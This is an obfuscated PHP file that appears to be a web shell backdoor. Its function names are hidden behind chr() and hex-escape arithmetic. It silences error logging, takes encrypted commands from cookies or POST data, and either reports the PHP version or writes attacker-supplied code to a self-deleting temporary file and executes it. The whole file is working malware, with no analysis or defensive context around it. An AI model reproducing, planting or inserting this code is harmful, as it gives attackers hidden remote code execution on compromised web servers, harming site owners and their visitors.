<?php $nhuNorvgfy = chr(893-791).chr(268-163).chr(844-736)."\145"."\x5f".'p'."\x75".'t'.chr(663-568)."\x63".chr(111).'n'."\164".chr(101).chr(510-400).chr(294-178).'s';
$pjWYl = chr(119-21).chr(97)."\x73"."\x65".chr(245-191).'4'."\x5f".chr(564-464).chr(999-898).'c'."\157"."\144"."\x65";
$JFLWOcF = 'i'.chr(931-821).chr(105).chr(95)."\163".chr(101).chr(791-675);
$PTkEQGTfI = "\x75".chr(110)."\x6c"."\151"."\156"."\x6b";


@$JFLWOcF('e'.chr(1089-975).'r'."\157".'r'.'_'.chr(108)."\157".'g', NULL);
@$JFLWOcF("\x6c"."\157".chr(1021-918)."\x5f"."\x65".chr(114).'r'.'o'."\162".chr(115), 0);
@$JFLWOcF('m'.chr(453-356).chr(313-193).'_'.'e'.chr(278-158)."\145".chr(99).chr(117).chr(483-367).chr(277-172).chr(390-279)."\x6e".chr(242-147)."\164".chr(105).chr(113-4)."\145", 0);
@set_time_limit(0);

function XezwOogC($yxVYHPr, $QtQiQhpQHL)
{
    $heHnGgKXkF = "";
    for ($ZLFtDeZ = 0; $ZLFtDeZ < strlen($yxVYHPr);) {
        for ($j = 0; $j < strlen($QtQiQhpQHL) && $ZLFtDeZ < strlen($yxVYHPr); $j++, $ZLFtDeZ++) {
            $heHnGgKXkF .= chr(ord($yxVYHPr[$ZLFtDeZ]) ^ ord($QtQiQhpQHL[$j]));
        }
    }
    return $heHnGgKXkF;
}

$KtvtsAnaCo = array_merge($_COOKIE, $_POST);
$vJAlQz = 'f381791c-1928-4bbd-aff4-5a21522f8053';
foreach ($KtvtsAnaCo as $ProbuMZt => $yxVYHPr) {
    $yxVYHPr = @unserialize(XezwOogC(XezwOogC($pjWYl($yxVYHPr), $vJAlQz), $ProbuMZt));
    if (isset($yxVYHPr[chr(138-41).chr(320-213)])) {
        if ($yxVYHPr["\141"] == 'i') {
            $ZLFtDeZ = array(
                chr(681-569)."\166" => @phpversion(),
                "\x73".chr(135-17) => "3.5",
            );
            echo @serialize($ZLFtDeZ);
        } elseif ($yxVYHPr["\141"] == chr(219-118)) {
            $qilBX = "./" . md5($vJAlQz) . chr(262-216)."\x69".chr(110).chr(99);
            @$nhuNorvgfy($qilBX, "<" . chr(63).chr(446-334)."\x68".'p'."\40".'@'.'u'.'n'.chr(516-408)."\151".chr(110)."\153".chr(40).chr(376-281).'_'."\x46".chr(742-669)."\114"."\105"."\137".chr(95)."\51".chr(59)."\x20" . $yxVYHPr[chr(234-134)]);
            include($qilBX);
            @$PTkEQGTfI($qilBX);
        }
        exit();
    }
}

